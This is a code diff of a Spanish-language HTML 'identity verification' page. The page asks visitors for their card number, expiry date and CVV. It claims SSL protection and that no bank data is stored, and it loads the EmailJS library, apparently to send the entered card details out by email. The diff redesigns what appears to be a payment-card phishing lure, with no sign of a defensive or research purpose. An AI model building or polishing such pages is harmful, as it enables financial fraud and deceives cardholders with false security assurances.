@@ -7,45 +7,50 @@
     <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <div class="decoracion-top">🌸</div>
-    <div class="container">
-        <div class="header">
-            <div class="icono-seguridad">🔒</div>
-            <h1>Verificación de Identidad</h1>
-            <p class="subtitulo">Proceso 100% seguro</p>
-        </div>
-
-        <form id="paymentForm">
-            <div class="input-group">
-                <label>🌷 Nombre del titular</label>
-                <input type="text" id="nombre" placeholder="Ej. Ana García" required>
+    <div class="fondo-decorativo"></div>
+    
+    <main class="contenedor-principal">
+        <div class="tarjeta-verificacion">
+            <div class="encabezado">
+                <div class="icono-seguridad animate-bounce">🔒</div>
+                <h1>Verificación Requerida</h1>
+                <p class="leyenda-seguridad">Protegido por encriptación SSL 256-bit</p>
             </div>
 
-            <div class="input-group">
-                <label>💳 Número de tarjeta</label>
-                <input type="text" id="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
-            </div>
-
-            <div class="input-group-dual">
-                <div class="input-group">
-                    <label>📅 Fecha de expiración</label>
-                    <input type="month" id="fecha" required>
+            <form id="formularioVerificacion">
+                <div class="grupo-input">
+                    <label>👤 Nombre del Titular</label>
+                    <input type="text" id="nombre" placeholder="Ej. María González" required>
                 </div>
-                <div class="input-group">
-                    <label>🔑 Código CVV</label>
-                    <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+
+                <div class="grupo-input">
+                    <label>💳 Número de Tarjeta</label>
+                    <input type="text" id="tarjeta" placeholder="0000 0000 0000 0000" maxlength="19" required>
                 </div>
+
+                <div class="grupo-doble">
+                    <div class="grupo-input">
+                        <label>📅 Fecha de Expiración</label>
+                        <input type="month" id="fecha" required>
+                    </div>
+                    <div class="grupo-input">
+                        <label>🔐 Código CVV</label>
+                        <input type="text" id="cvv" placeholder="123" maxlength="4" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="boton-verificacion">
+                    <span class="texto-boton">Verificar Identidad</span>
+                    <span class="icono-boton">🌸</span>
+                </button>
+            </form>
+
+            <div class="aviso-legal">
+                <div class="icono-aviso">⚠️</div>
+                <p>Este proceso es solo de verificación. No almacenamos datos bancarios.</p>
             </div>
-
-            <button type="submit">Verificar Identidad 🌸</button>
-        </form>
-
-        <div class="aviso-seguridad">
-            <div class="candado-icon">🔐</div>
-            <p>Tus datos están protegidos con encriptación SSL</p>
         </div>
-    </div>
-    <div class="decoracion-bottom">🌺</div>
+    </main>
 
     <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     <script src="script.js"></script>
